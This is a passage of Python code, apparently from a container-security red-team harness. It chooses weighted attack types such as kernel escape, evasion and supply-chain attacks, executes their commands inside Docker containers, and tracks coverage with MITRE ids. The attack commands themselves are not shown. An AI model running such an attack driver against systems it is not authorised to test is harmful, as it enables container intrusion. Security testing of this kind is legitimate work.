            result = self._select_advanced_attack(available_targets)

        result["target_container"] = available_targets[0] if available_targets else "unknown"
        self.attacks_used.add(result["attack_name"])
        self.attack_history.append(result)
        return result

    def _select_advanced_attack(self, targets: list) -> dict:
        unused = [a for a in ADVANCED_ATTACKS if a["attack_name"] not in self.attacks_used]
        pool = unused if unused else ADVANCED_ATTACKS

        weights = {
            "KERNEL_ESCAPE": 3,
            "MEMORY_INJECTION": 2,
            "CAPABILITY_ABUSE": 2,
            "FILESYSTEM_ATTACK": 2,
            "EVASION": 3,
            "NETWORK_ATTACK": 2,
            "SUPPLY_CHAIN": 1,
        }

        weighted = []
        for a in pool:
            w = weights.get(a["type"], 1)
            if a["difficulty"] == "HARD":
                w *= 2
            weighted.extend([a] * w)

        attack = random.choice(weighted)
        attack["target_container"] = targets[0] if targets else "unknown"
        return attack

    async def execute_attack(self, docker_controller, attack_plan: dict) -> dict:
        target = attack_plan.get("target_container", "")
        commands = attack_plan.get("commands", [])

        results = []
        for cmd in commands:
            exit_code, output = docker_controller.exec_command(target, cmd)
            results.append({
                "command": cmd[:150],
                "exit_code": exit_code,
                "output": output[:500],
            })
            time.sleep(0.8)

        return {
            "attack": attack_plan["attack_name"],
            "target": target,
            "type": attack_plan.get("type", "GENERIC"),
            "mitre_id": attack_plan.get("mitre_id", ""),
            "difficulty": attack_plan.get("difficulty", "MEDIUM"),
            "detection_bypass": attack_plan.get("detection_bypass", "LOW"),
            "commands_executed": len(commands),
            "results": results,
            "timestamp": __import__("datetime").datetime.utcnow().isoformat(),
        }

    def get_attack_coverage(self) -> dict:
        types_covered = set()
        for a in self.attack_history:
            types_covered.add(a.get("type", "GENERIC"))

        return {
            "total_attacks": len(self.attack_history),
            "unique_types": list(types_covered),
            "attacks_used": list(self.attacks_used),
            "types_missing": [t for t in ["KERNEL_ESCAPE", "MEMORY_INJECTION", "CAPABILITY_ABUSE",
                                            "FILESYSTEM_ATTACK", "EVASION", "NETWORK_ATTACK", "SUPPLY_CHAIN"]
                              if t not in types_covered],
        }
